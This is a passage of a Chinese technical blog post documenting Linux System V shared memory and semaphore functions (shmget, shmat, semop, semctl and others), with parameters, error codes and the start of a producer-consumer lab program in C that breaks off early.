href="https://baike.baidu.com/item/%E7%BA%BF%E7%A8%8B" target="_blank" rel="noopener">线程</a>/进程都会将该整数减一（通过它当然是为了使用资源），当该整数值为零时，所有试图通过它的线程都将处于等待状态。在信号量上我们定义两种操作： Wait（等待） 和 Release（释放）。当一个线程调用Wait操作时，它要么得到资源然后将信号量减一，要么一直等下去（指放入阻塞队列），直到信号量大于等于一时。Release（释放）实际上是在信号量上执行加操作，对应于车辆离开停车场，该操作之所以叫做“释放”是因为释放了由信号量守护的资源。在通用术语上我们将此两种操作成为P、V操作。而操作的对象就是信号量（signal)，用来实现线程/进程的同步、异步和互斥。</p><h3 id="四、共享内存函数"><a href="#四、共享内存函数" class="headerlink" title="四、共享内存函数"></a>四、共享内存函数</h3><p>共享内存函数由shmget、shmat、shmdt、shmctl四个函数组成。下面列出了这四个函数的函数原型及其具体说明。</p><h4 id="1-shmget函数原型"><a href="#1-shmget函数原型" class="headerlink" title="1.   shmget函数原型"></a>1.   shmget函数原型</h4><p>shmget(得到一个共享内存标识符或创建一个共享内存对象)</p><h5 id="所需头文件："><a href="#所需头文件：" class="headerlink" title="所需头文件："></a>所需头文件：</h5><p><code>#include &lt;sys/ipc.h&gt;</code></p><p><code>#include &lt;sys/shm.h&gt;</code></p><h5 id="函数说明："><a href="#函数说明：" class="headerlink" title="函数说明："></a>函数说明：</h5><p>得到一个共享内存标识符或创建一个共享内存对象并返回共享内存标识符</p><h5 id="函数原型："><a href="#函数原型：" class="headerlink" title="函数原型："></a>函数原型：</h5><p>int shmget(key_t key, size_t size, int shmflg)</p><h5 id="函数传入值："><a href="#函数传入值：" class="headerlink" title="函数传入值："></a>函数传入值：</h5><p>key：</p><p>（1）0(IPC_PRIVATE)：会建立新共享内存对象。</p><p>（2）大于0的32位整数：视参数shmflg来确定操作。通常要求此值来源于ftok返回的IPC键值。</p><p>size：</p><p>（1）大于0的整数：新建的共享内存大小，以字节为单位。</p><p>（2）0：只获取共享内存时指定为0。</p><p>shmflg：</p><p>（1）0：取共享内存标识符，若不存在则函数会报错。</p><p>（2）IPC_CREAT：当shmflg&amp;IPC_CREAT为真时，如果内核中不存在键值与key相等的共享内存，则新建一个共享内存；如果存在这样的共享内存，返回此共享内存的标识符。</p><p>（3）IPC_CREAT|IPC_EXCL：如果内核中不存在键值与key相等的共享内存，则新建一个消息队列；如果存在这样的共享内存则报错。</p><h5 id="函数返回值："><a href="#函数返回值：" class="headerlink" title="函数返回值："></a>函数返回值：</h5><p>（1）成功：返回共享内存的标识符。</p><p>（2）出错：-1，错误原因存于error中。</p><h5 id="附加说明："><a href="#附加说明：" class="headerlink" title="附加说明："></a>附加说明：</h5><p>上述shmflg参数为模式标志参数，使用时需要与IPC对象存取权限（如0600表示用户可以读写改内存）进行|运算来确定信号量集的存取权限 。</p><h5 id="错误代码："><a href="#错误代码：" class="headerlink" title="错误代码："></a>错误代码：</h5><p>（1）EINVAL：参数size小于SHMMIN或大于SHMMAX 。</p><p>（2）EEXIST：预建立key所指的共享内存，但已经存在 。</p><p>（3）EIDRM：参数key所指的共享内存已经删除 。</p><p>（4）ENOSPC：超过了系统允许建立的共享内存的最大值(SHMALL)。</p><p>（5）ENOENT：参数key所指的共享内存不存在，而参数shmflg未设IPC_CREAT位 。</p><p>（6）EACCES：没有权限 。</p><p>（7）ENOMEM：核心内存不足。</p><h5 id="附加说明：-1"><a href="#附加说明：-1" class="headerlink" title="附加说明："></a>附加说明：</h5><p>在Linux环境中，对开始申请的共享内存空间进行了初始化，初始值为0x00。</p><p>如果用shmget创建了一个新的消息队列对象时，则shmid_ds结构成员变量的值设置如下：</p><p>shm_lpid、shm_nattach、shm_atime、shm_dtime设置为0。</p><p>msg_ctime设置为当前时间。</p><p>shm_segsz设成创建共享内存的大小。</p><p>shmflg的读写权限放在shm_perm.mode中。</p><p>shm_perm结构的uid和cuid成员被设置成当前进程的有效用户ID，gid和cuid成员被设置成当前进程的有效组ID。</p><h4 id="2-shmat函数原型"><a href="#2-shmat函数原型" class="headerlink" title="2.   shmat函数原型"></a>2.   shmat函数原型</h4><p>shmat(把共享内存区对象映射到调用进程的地址空间)</p><h5 id="所需头文件：-1"><a href="#所需头文件：-1" class="headerlink" title="所需头文件："></a>所需头文件：</h5><p><code>#include &lt;sys/types.h&gt;</code></p><p><code>#include &lt;sys/shm.h&gt;</code></p><h5 id="函数说明：-1"><a href="#函数说明：-1" class="headerlink" title="函数说明："></a>函数说明：</h5><p>连接共享内存标识符为shmid的共享内存，连接成功后把共享内存区对象映射到调用进程的地址空间，随后可像本地空间一样访问。</p><h5 id="函数原型：-1"><a href="#函数原型：-1" class="headerlink" title="函数原型："></a>函数原型：</h5><p>void <em>shmat(int shmid, const void </em>shmaddr, int shmflg)</p><h5 id="函数传入值：-1"><a href="#函数传入值：-1" class="headerlink" title="函数传入值："></a>函数传入值：</h5><p>msqid：共享内存标识符。</p><p>shmaddr：指定共享内存出现在进程内存地址的什么位置，直接指定为NULL让内核自己决定一个合适的地址位置。</p><p>shmflg：SHM_RDONLY：为只读模式，其他为读写模式。</p><h5 id="函数返回值：-1"><a href="#函数返回值：-1" class="headerlink" title="函数返回值："></a>函数返回值：</h5><p>（1）成功：附加好的共享内存地址。</p><p>（2）出错：-1，错误原因存于error中。</p><h5 id="附加说明：-2"><a href="#附加说明：-2" class="headerlink" title="附加说明："></a>附加说明：</h5><p>fork后子进程继承已连接的共享内存地址。exec后该子进程与已连接的共享内存地址自动脱离(detach)。进程结束后，已连接的共享内存地址会自动脱离(detach)。</p><h5 id="错误代码：-1"><a href="#错误代码：-1" class="headerlink" title="错误代码："></a>错误代码：</h5><p>（1）EACCES：无权限以指定方式连接共享内存。</p><p>（2）EINVAL：无效的参数shmid或shmaddr。</p><p>（3）ENOMEM：核心内存不足。</p><h4 id="3-shmdt函数原型"><a href="#3-shmdt函数原型" class="headerlink" title="3.   shmdt函数原型"></a>3.   shmdt函数原型</h4><p>shmat(断开共享内存连接)</p><h5 id="所需头文件：-2"><a href="#所需头文件：-2" class="headerlink" title="所需头文件："></a>所需头文件：</h5><p><code>#include &lt;sys/types.h&gt;</code></p><p><code>#include &lt;sys/shm.h&gt;</code></p><h5 id="函数说明：-2"><a href="#函数说明：-2" class="headerlink" title="函数说明："></a>函数说明：</h5><p>与shmat函数相反，是用来断开与共享内存附加点的地址，禁止本进程访问此片共享内存。</p><h5 id="函数原型：-2"><a href="#函数原型：-2" class="headerlink" title="函数原型："></a>函数原型：</h5><p>int shmdt(const void *shmaddr)</p><h5 id="函数传入值：-2"><a href="#函数传入值：-2" class="headerlink" title="函数传入值："></a>函数传入值：</h5><p>shmaddr：连接的共享内存的起始地址。</p><h5 id="函数返回值：-2"><a href="#函数返回值：-2" class="headerlink" title="函数返回值："></a>函数返回值：</h5><p>（1）成功：0。</p><p>（2）出错：-1，错误原因存于error中。</p><h5 id="附加说明：-3"><a href="#附加说明：-3" class="headerlink" title="附加说明："></a>附加说明：</h5><p>本函数调用并不删除所指定的共享内存区，而只是将先前用shmat函数连接（attach）好的共享内存脱离（detach）目前的进程。</p><h5 id="错误代码：-2"><a href="#错误代码：-2" class="headerlink" title="错误代码："></a>错误代码：</h5><p>EINVAL：无效的参数shmaddr。</p><h4 id="4-shmctl函数原型"><a href="#4-shmctl函数原型" class="headerlink" title="4.   shmctl函数原型"></a>4.   shmctl函数原型</h4><p>shmctl(共享内存管理)</p><h5 id="所需头文件：-3"><a href="#所需头文件：-3" class="headerlink" title="所需头文件："></a>所需头文件：</h5><p><code>#include &lt;sys/types.h&gt;</code></p><p><code>#include &lt;sys/shm.h&gt;</code></p><h5 id="函数说明：-3"><a href="#函数说明：-3" class="headerlink" title="函数说明："></a>函数说明：</h5><p>完成对共享内存的控制</p><h5 id="函数原型：-3"><a href="#函数原型：-3" class="headerlink" title="函数原型："></a>函数原型：</h5><p>int shmctl(int shmid, int cmd, struct shmid_ds *buf)</p><h5 id="函数传入值：-3"><a href="#函数传入值：-3" class="headerlink" title="函数传入值："></a>函数传入值：</h5><p>msqid：共享内存标识符</p><p>cmd:</p><p>（1）IPC_STAT：得到共享内存的状态，把共享内存的shmid_ds结构复制到buf中。</p><p>（2）IPC_SET：改变共享内存的状态，把buf所指的shmid_ds结构中的uid、gid、mode复制到共享内存的shmid_ds结构内 。</p><p>（3）IPC_RMID：删除这片共享内存。</p><p>buf：共享内存管理结构体。具体说明参见共享内存内核结构定义部分</p><h5 id="函数返回值：-3"><a href="#函数返回值：-3" class="headerlink" title="函数返回值："></a>函数返回值：</h5><p>（1）成功：0。</p><p>（2）出错：-1，错误原因存于error中。</p><h5 id="错误代码：-3"><a href="#错误代码：-3" class="headerlink" title="错误代码："></a>错误代码：</h5><p>（1）EACCESS：参数cmd为IPC_STAT，确无权限读取该共享内存。</p><p>（2）EFAULT：参数buf指向无效的内存地址。</p><p>（3）EIDRM：标识符为msqid的共享内存已被删除。</p><p>（4）EINVAL：无效的参数cmd或shmid。</p><p>（5）EPERM：参数cmd为IPC_SET或IPC_RMID，却无足够的权限执行 。</p><h3 id="四、信号量函数"><a href="#四、信号量函数" class="headerlink" title="四、信号量函数"></a>四、信号量函数</h3><p>信号量函数由semget、semop、semctl三个函数组成。下面列出了这三个函数的函数原型及具体说明。</p><h4 id="1-semget函数原型"><a href="#1-semget函数原型" class="headerlink" title="1.   semget函数原型"></a>1.   semget函数原型</h4><p>semget(得到一个信号量集标识符或创建一个信号量集对象)</p><h5 id="所需头文件：-4"><a href="#所需头文件：-4" class="headerlink" title="所需头文件："></a>所需头文件：</h5><p><code>#include &lt;sys/types.h&gt;</code></p><p><code>#include &lt;sys/ipc.h&gt;</code></p><p><code>#include &lt;sys/sem.h&gt;</code></p><h5 id="函数说明：-4"><a href="#函数说明：-4" class="headerlink" title="函数说明："></a>函数说明：</h5><p>得到一个信号量集标识符或创建一个信号量集对象并返回信号量集标识符。</p><h5 id="函数原型：-4"><a href="#函数原型：-4" class="headerlink" title="函数原型："></a>函数原型：</h5><p>int semget(key_t key, int nsems, int semflg)</p><h5 id="函数传入值：-4"><a href="#函数传入值：-4" class="headerlink" title="函数传入值："></a>函数传入值：</h5><p>key：</p><p>（1）0(IPC_PRIVATE)：会建立新信号量集对象。</p><p>（2）大于0的32位整数：视参数semflg来确定操作，通常要求此值来源于ftok返回的IPC键值。</p><p>nsems：创建信号量集中信号量的个数，该参数只在创建信号量集时有效。</p><p>semfl：</p><p>（1）0：取信号量集标识符，若不存在则函数会报错。</p><p>（2）IPC_CREAT：当semflg&amp;IPC_CREAT为真时，如果内核中不存在键值与key相等的信号量集，则新建一个信号量集；如果存在这样的信号量集，返回此信号量集的标识符。</p><p>（3）IPC_CREAT|IPC_EXCL：如果内核中不存在键值与key相等的信号量集，则新建一个消息队列；如果存在这样的信号量集则报错。</p><h5 id="函数返回值：-4"><a href="#函数返回值：-4" class="headerlink" title="函数返回值："></a>函数返回值：</h5><p>（1）成功：返回信号量集的标识符。</p><p>（2）出错：-1，错误原因存于error中。</p><h5 id="附加说明：-4"><a href="#附加说明：-4" class="headerlink" title="附加说明："></a>附加说明：</h5><p>上述semflg参数为模式标志参数，使用时需要与IPC对象存取权限（如0600如共享内存函数）进行|运算来确定信号量集的存取权限 。</p><h5 id="错误代码：-4"><a href="#错误代码：-4" class="headerlink" title="错误代码："></a>错误代码：</h5><p>（1）EACCESS：没有权限。</p><p>（2）EEXIST：信号量集已经存在，无法创建。</p><p>（3）EIDRM：信号量集已经删除。</p><p>（4）ENOENT：信号量集不存在，同时semflg没有设置IPC_CREAT标志。</p><p>（5）ENOMEM：没有足够的内存创建新的信号量集。</p><p>（6）ENOSPC：超出限制。</p><p>如果用semget创建了一个新的信号量集对象时，则semid_ds结构成员变量的值设置如下：</p><p>​        sem_otime设置为0。</p><p>​        sem_ctime设置为当前时间。</p><p>​        msg_qbytes设成系统的限制值。</p><p>​        sem_nsems设置为nsems参数的数值。</p><p>​        semflg的读写权限写入sem_perm.mode中。</p><p>​        sem_perm结构的uid和cuid成员被设置成当前进程的有效用户ID，gid和cuid成员被设置成当前进程的有效组ID。</p><h4 id="2-semop函数原型"><a href="#2-semop函数原型" class="headerlink" title="2.   semop函数原型"></a>2.   semop函数原型</h4><p>semop(完成对信号量的P操作或V操作)</p><h5 id="所需头文件：-5"><a href="#所需头文件：-5" class="headerlink" title="所需头文件："></a>所需头文件：</h5><p><code>#include &lt;sys/types.h&gt;</code></p><p><code>#include &lt;sys/ipc.h&gt;</code></p><p><code>#include &lt;sys/sem.h&gt;</code></p><h5 id="函数说明：-5"><a href="#函数说明：-5" class="headerlink" title="函数说明："></a>函数说明：</h5><p>对信号量集标识符为semid中的一个或多个信号量进行P操作或V操作。</p><h5 id="函数原型：-5"><a href="#函数原型：-5" class="headerlink" title="函数原型："></a>函数原型：</h5><p>int semop(int semid, struct sembuf *sops, unsigned nsops)</p><h5 id="函数传入值：-5"><a href="#函数传入值：-5" class="headerlink" title="函数传入值："></a>函数传入值：</h5><p>semid：信号量集标识符。</p><p>sops：指向进行操作的信号量集结构体数组的首地址，此结构的具体说明如下：</p><p>struct sembuf {</p><p>​    short semnum; /<em>信号量集合中的信号量编号，0代表第1个信号量</em>/</p><p>​    short val;/<em>若val&gt;0进行V操作信号量值加val，表示进程释放控制的资源 </em>/</p><p>/<em>若val&lt;0进行P操作信号量值减val，若(semval-val)&lt;0（semval为该信号量值），则调用进程阻塞，直到资源可用；若设置IPC_NOWAIT不会睡眠，进程直接返回EAGAIN错误</em>/ </p><p>  /<em>若val==0时阻塞等待信号量为0，调用进程进入睡眠状态，直到信号值为0；若设置IPC_NOWAIT，进程不会睡眠，直接返回EAGAIN错误</em>/</p><p>​    short flag;  /<em>0 设置信号量的默认操作</em>/</p><p>/<em>IPC_NOWAIT设置信号量操作不等待</em>/</p><p>/<em>SEM_UNDO 选项会让内核记录一个与调用进程相关的UNDO记录，如果该进程崩溃，则根据这个进程的UNDO记录自动恢复相应信号量的计数值</em>/</p><p>  }; </p><p>nsops：进行操作信号量的个数，即sops结构变量的个数，需大于或等于1。最常见设置此值等于1，只完成对一个信号量的操作。</p><h5 id="函数返回值：-5"><a href="#函数返回值：-5" class="headerlink" title="函数返回值："></a>函数返回值：</h5><p>（1）成功：返回信号量集的标识符。</p><p>（2）出错：-1，错误原因存于error中。</p><h5 id="错误代码：-5"><a href="#错误代码：-5" class="headerlink" title="错误代码："></a>错误代码：</h5><p>（1）E2BIG：一次对信号量个数的操作超过了系统限制。</p><p>（2）EACCESS：权限不够。</p><p>（3）EAGAIN：使用了IPC_NOWAIT，但操作不能继续进行。</p><p>（4）EFAULT：sops指向的地址无效。</p><p>（5）EIDRM：信号量集已经删除。</p><p>（6）EINTR：当睡眠时接收到其他信号。</p><p>（7）EINVAL：信号量集不存在,或者semid无效。</p><p>（8）ENOMEM：使用了SEM_UNDO，但无足够的内存创建所需的数据结构。</p><p>（9）ERANGE：信号量值超出范围。</p><p>sops为指向sembuf数组，定义所要进行的操作序列。下面是信号量操作举例。</p><p>struct sembuf sem_get={0,-1,IPC_NOWAIT}; /<em>将信号量对象中序号为0的信号量减1</em>/</p><p>struct sembuf sem_get={0,1,IPC_NOWAIT};  /<em>将信号量对象中序号为0的信号量加1</em>/</p><p>struct sembuf sem_get={0,0,0};           /<em>进程被阻塞，直到对应的信号量值为0</em>/</p><p>flag一般为0，若flag包含IPC_NOWAIT，则该操作为非阻塞操作。若flag包含SEM_UNDO，则当进程退出的时候会还原该进程的信号量操作，这个标志在某些情况下是很有用的，比如某进程做了P操作得到资源，但还没来得及做V操作时就异常退出了，此时，其他进程就只能都阻塞在P操作上，于是造成了死锁。若采取SEM_UNDO标志，就可以避免因为进程异常退出而造成的死锁。</p><h4 id="3-semctl函数原型"><a href="#3-semctl函数原型" class="headerlink" title="3.   semctl函数原型"></a>3.   semctl函数原型</h4><p>semctl (得到一个信号量集标识符或创建一个信号量集对象)</p><h5 id="所需头文件：-6"><a href="#所需头文件：-6" class="headerlink" title="所需头文件："></a>所需头文件：</h5><p><code>#include &lt;sys/types.h&gt;</code></p><p><code>#include &lt;sys/ipc.h&gt;</code></p><p><code>#include &lt;sys/sem.h&gt;</code></p><h5 id="函数说明：-6"><a href="#函数说明：-6" class="headerlink" title="函数说明："></a>函数说明：</h5><p>得到一个信号量集标识符或创建一个信号量集对象并返回信号量集标识符。</p><h5 id="函数原型：-6"><a href="#函数原型：-6" class="headerlink" title="函数原型："></a>函数原型：</h5><p>int semctl(int semid, int semnum, int cmd, union semun arg)</p><h5 id="函数传入值：-6"><a href="#函数传入值：-6" class="headerlink" title="函数传入值："></a>函数传入值：</h5><p>semid：信号量集标识符。</p><p>semnum：信号量集数组上的下标，表示某一个信号量。</p><p>cmd：见下文表。</p><p>arg：</p><p>union semun {</p><p>   short val;          /<em>SETVAL用的值</em>/</p><p>   struct semid_ds<em> buf; /</em>IPC_STAT、IPC_SET用的semid_ds结构*/</p><p>   unsigned short<em> array; /</em>SETALL、GETALL用的数组值*/</p><p>   struct seminfo <em>buf;   /</em>为控制IPC_INFO提供的缓存*/</p><p>  } arg;</p><h5 id="函数返回值：-6"><a href="#函数返回值：-6" class="headerlink" title="函数返回值："></a>函数返回值：</h5><p>（1）成功：大于或等于0，具体说明请参照下文表。</p><p>（2）出错：-1，错误原因存于error中。</p><h5 id="附加说明：-5"><a href="#附加说明：-5" class="headerlink" title="附加说明："></a>附加说明：</h5><p>semid_ds结构见信号量集内核结构定义。</p><h5 id="错误代码：-6"><a href="#错误代码：-6" class="headerlink" title="错误代码："></a>错误代码：</h5><p>（1）EACCESS：权限不够。</p><p>（2）EFAULT：arg指向的地址无效。</p><p>（3）EIDRM：信号量集已经删除。</p><p>（4）EINVAL：信号量集不存在，或者semid无效。</p><p>（5）EPERM：进程有效用户没有cmd的权限。</p><p>（6）ERANGE：信号量值超出范围。</p><p>表-semctl函数cmd形参说明表</p><table><thead><tr><th>命令</th><th>解   释</th></tr></thead><tbody><tr><td>IPC_STAT</td><td>从信号量集上检索semid_ds结构，并存到semun联合体参数的成员buf的地址中</td></tr><tr><td>IPC_SET</td><td>设置一个信号量集合的semid_ds结构中ipc_perm域的值，并从semun的buf中取出值</td></tr><tr><td>IPC_RMID</td><td>从内核中删除信号量集合</td></tr><tr><td>GETALL</td><td>从信号量集合中获得所有信号量的值，并把其整数值存到semun联合体成员的一个指针数组中</td></tr><tr><td>GETNCNT</td><td>返回当前等待资源的进程个数</td></tr><tr><td>GETPID</td><td>返回最后一个执行系统调用semop()进程的PID</td></tr><tr><td>GETVAL</td><td>返回信号量集合内单个信号量的值</td></tr><tr><td>GETZCNT</td><td>返回当前等待100%资源利用的进程个数</td></tr><tr><td>SETALL</td><td>与GETALL正好相反</td></tr><tr><td>SETVAL</td><td>用联合体中val成员的值设置信号量集合中单个信号量的值</td></tr></tbody></table><h3 id="五、struct-sembuf的部分讲解"><a href="#五、struct-sembuf的部分讲解" class="headerlink" title="五、struct sembuf的部分讲解"></a>五、struct sembuf的部分讲解</h3><p><code>struct sembuf</code><br>{<br>  unsigned short int sem_num;   /<em> 信号量的序号从0~nsems-1 </em>/<br>  short int sem_op;            /<em> 对信号量的操作，&gt;0, 0, &lt;0 </em>/<br>  short int sem_flg;            /<em> 操作标识：0， IPC_WAIT, SEM_UNDO </em>/<br><code>};</code> </p><p><strong>sem_num</strong>标识信号量集中的第几个信号量，0表示第1个，1表示第2个，nsems - 1表示最后一个。</p><p><strong>sem_op</strong>标识对信号量的所进行的操作类型。对信号量的操作有三种类型：</p><ul><li>sem_op &gt; 0，对该信号量执行挂出操作，挂出的值由sem_op决定，系统会把sem_op的值加到该信号量的当前值semval（参考文章开头关于每个信号量结构的定义）上。如果sem_flag指定了SEM_UNDO（还原）标志，那么相应信号量的semadj值会减掉sem_op的值。下面会说明semadj的含义。</li><li>sem_op &lt; 0，对该信号量执行等待操作，当信号量的当前值semval &gt;= -sem_op时，semval减掉sem_op的绝对值，为该线程分配对应数目的资源。如果指定SEM_UNDO，相应信号量的semadj就加上sem_op的绝对值。当semval &lt; -sem_op时，相应信号量的semncnt就加1，调用线程被阻塞，直到semval &gt;= -sem_op，当此条件满足时，调用线程被唤醒，执行相应的分配操作，然后semncnt减去1.</li><li>sem_op = 0，表示调用者希望semval变为0。如果为0则立即返回，如果不为0，相应信号量的semzcnt加1，调用调用线程被阻塞。</li></ul><p><strong>sem_flag</strong>：信号量操作的属性标志，如果为0，表示正常操作，如果为IPC_WAIT，使对信号量的操作时非阻塞的。即指定了该标志，调用线程在信号量的值不满足条件的情况下不会被阻塞，而是直接返回-1，并将errno设置为EAGAIN。如果为SEM_UNDO，那么将维护进程对信号量的调整值，以便进程结束时恢复信号量的状态。</p><p>下面解释一下与单个信号量相关的几个值：</p><p><strong>semval</strong>：信号量的当前值，在文章开头信号量的结构中已提到。<em>**</em></p><p><strong>semncnt</strong>：等待semval变为大于当前值的线程数。在文章开头信号量的结构中已提到。</p><p><strong>semzcnt</strong>：等待semval变为0的线程数。在文章开头信号量的结构中已提到。</p><p><strong>semadj</strong>：指定信号量针对某个特定进程的调整值。只有sembuf结构的sem_flag指定为SEM_UNDO后，semadj才会随着sem_op而更新。<strong>讲简单一点：对某个进程，在指定SEM_UNDO后，对信号量semval值的修改都会反应到semadj上，当该进程终止的时候，内核会根据semadj的值，重新恢复信号量之前的值。</strong></p><h3 id="六、本次实验代码"><a href="#六、本次实验代码" class="headerlink" title="六、本次实验代码"></a>六、本次实验代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_BUFFER_SIZE 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_MODE 0600</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEM_MODE 0600</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEM_FULL 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEM_EMPTY 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MUTEX 2</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#if defined(__GNU_LIBRARY__) &amp;&amp; !defined(_SEM_SEMUN_UNDEFINED)</span></span><br><span class="line"><span class="comment">// union   semun   is   defined   by   including   &lt;sys/sem.h&gt;   </span></span><br><span class="line"><span class="comment">#else </span></span><br><span class="line"><span class="comment">//   according   to   X/OPEN   we   have   to   define   it   ourselves  </span></span><br><span class="line"><span class="comment">union semun&#123;</span></span><br><span class="line"><span class="comment">int val;</span></span><br><span class="line"><span class="comment">struct semid_ds *buf;</span></span><br><span class="line"><span 